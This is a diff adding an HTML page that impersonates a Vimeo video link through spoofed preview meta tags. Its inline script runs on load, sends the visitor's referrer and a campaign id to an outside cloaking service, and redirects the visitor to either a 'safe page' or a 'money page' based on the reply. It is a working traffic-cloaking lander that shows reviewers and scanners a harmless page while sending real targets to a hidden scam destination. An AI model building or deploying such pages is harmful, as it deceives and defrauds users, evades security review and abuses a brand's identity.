@@ -1,0 +1,67 @@
+<html>
+<head>
+<meta property="og:site_name" content="Vimeo">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=5.0,user-scalable=yes">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta property="og:title" content="video">
+<meta property="og:description" content="5.502.608 Views">
+<meta property="og:url" content="https://www.vimeo.com">
+<meta property="og:type" content="video">
+
+<script>
+
+let $endpoint = 'https://trafficshield.tools/api/v2';
+let $campaign_id = '93c6dbcd-d130-46f1-bb6e-55d6d7c695bb';
+let $safe_page = '';
+let $money_page = '';
+
+function sendRequestAndGetResult() {
+
+    let http = new XMLHttpRequest();
+    http.open("POST", $endpoint + '?_=' + new Date().getTime(), true);
+
+    http.setRequestHeader('campaign-id', $campaign_id);
+    http.setRequestHeader('javascript', true);
+    http.setRequestHeader('http-referer', document.referrer);
+    http.setRequestHeader('content-type', 'application/json');
+    http.setRequestHeader('cache-control', 'no-cache, must-revalidate, post-check=0, pre-check=0');
+    http.setRequestHeader('cache-control', 'max-age=0');
+    http.setRequestHeader('expires', '0');
+    http.setRequestHeader('expires', 'Tue, 01 Jan 1980 1:00:00 GMT');
+    http.setRequestHeader('pragma', 'no-cache');
+
+    http.onreadystatechange = function () {
+        if (http.readyState == 4 && http.status == 200) {
+            checkResponse(http.responseText);
+        }
+    };
+    http.send(null);
+}
+
+function checkResponse(res) {
+    let response = JSON.parse(res);
+    $money_page = response.money_page;
+    $safe_page = response.safe_page;
+
+    if (response.status === false) {
+        if ($safe_page !== "") {
+            if (window.location.href.indexOf($safe_page) > -1) {
+            } else {
+                window.location.href = $safe_page;
+            }
+        }
+    } else {
+        if ($money_page !== "") {
+            window.location.href = $money_page;
+        }
+    }
+}
+
+sendRequestAndGetResult();
+
+</script>
+
+</head>
+<body>
+</body>
+</html>
